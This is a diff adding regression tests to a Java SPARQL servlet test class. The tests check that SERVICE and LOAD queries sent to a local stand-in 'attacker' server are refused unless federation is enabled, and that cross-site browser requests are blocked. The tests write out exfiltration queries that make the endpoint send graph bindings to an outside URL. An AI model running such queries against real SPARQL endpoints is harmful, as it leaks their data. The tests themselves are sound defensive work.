@@ -263,6 +263,82 @@ class SparqlProtocolServletTest {
         }
     }
 
+    // ---- outbound requests: SERVICE and LOAD ------------------------------------------------
+
+    /** A stand-in for an attacker's SPARQL service: counts what it receives, answers an empty result. */
+    static final class Remote implements AutoCloseable {
+        final com.sun.net.httpserver.HttpServer server;
+        final java.util.concurrent.atomic.AtomicInteger hits = new java.util.concurrent.atomic.AtomicInteger();
+        final StringBuffer received = new StringBuffer();
+
+        Remote() throws IOException {
+            server = com.sun.net.httpserver.HttpServer.create(new java.net.InetSocketAddress("127.0.0.1", 0), 0);
+            server.createContext("/", ex -> {
+                hits.incrementAndGet();
+                received.append(ex.getRequestURI()).append(' ')
+                        .append(new String(ex.getRequestBody().readAllBytes(), StandardCharsets.UTF_8));
+                byte[] body = "{\"head\":{\"vars\":[]},\"results\":{\"bindings\":[]}}".getBytes(StandardCharsets.UTF_8);
+                ex.getResponseHeaders().add("Content-Type", "application/sparql-results+json");
+                ex.sendResponseHeaders(200, body.length);
+                ex.getResponseBody().write(body);
+                ex.close();
+            });
+            server.start();
+        }
+
+        String url() {
+            return "http://127.0.0.1:" + server.getAddress().getPort() + "/sparql";
+        }
+
+        @Override
+        public void close() {
+            server.stop(0);
+        }
+    }
+
+    /**
+     * The exfiltration found reviewing #105: SERVICE makes the server itself send bindings from
+     * the graph to any URL, and a cross-site {@code <img>} GET carries no Origin to stop it.
+     */
+    @Test
+    void serviceAndLoadAreRefusedUnlessFederationIsEnabled() throws Exception {
+        try (Remote remote = new Remote();
+             Endpoint rw = Endpoint.start(EndpointOptions.defaults().withUpdateEnabled(true), 0)) {
+            String leak = "SELECT * WHERE { ?v <urn:ex:depot> ?d . SERVICE <" + remote.url() + "> { ?v ?p ?o } }";
+            var q = get(rw.url(), leak, null);
+            assertEquals(403, q.statusCode(), q.body());
+            var u = post(rw.url(), "application/sparql-update",
+                    "INSERT { ?v <urn:ex:seen> ?o } WHERE { ?v <urn:ex:depot> ?d . SERVICE <" + remote.url() + "> { ?v ?p ?o } }", null);
+            assertEquals(403, u.statusCode(), u.body());
+            var load = post(rw.url(), "application/sparql-update", "LOAD <" + remote.url() + "/data.ttl>", null);
+            assertEquals(403, load.statusCode(), load.body());
+            assertEquals(0, remote.hits.get(), "the endpoint sent a request out: " + remote.received);
+        }
+        // and the vector is real: with federation on, the bindings do leave
+        try (Remote remote = new Remote();
+             Endpoint fed = Endpoint.start(EndpointOptions.defaults().withFederationEnabled(true), 0)) {
+            var q = get(fed.url(), "SELECT * WHERE { ?v <urn:ex:depot> ?d . SERVICE <" + remote.url() + "> { ?v ?p ?o } }", null);
+            assertEquals(200, q.statusCode(), q.body());
+            assertTrue(remote.hits.get() > 0);
+            assertTrue(remote.received.toString().contains("EV-7Q2"), remote.received.toString());
+        }
+    }
+
+    @Test
+    void crossSiteBrowserRequestsWithoutOriginAreRefused() throws Exception {
+        String url = shared.url() + "?query=" + enc("ASK {}");
+        for (String site : List.of("cross-site", "same-site")) {
+            var r = HTTP.send(HttpRequest.newBuilder(URI.create(url)).header("Sec-Fetch-Site", site).build(),
+                    HttpResponse.BodyHandlers.ofString());
+            assertEquals(403, r.statusCode(), site);
+        }
+        for (String site : List.of("none", "same-origin")) {
+            var r = HTTP.send(HttpRequest.newBuilder(URI.create(url)).header("Sec-Fetch-Site", site).build(),
+                    HttpResponse.BodyHandlers.ofString());
+            assertEquals(200, r.statusCode(), site);
+        }
+    }
+
     // ---- options that need their own endpoint ----------------------------------------------
 
     @Test
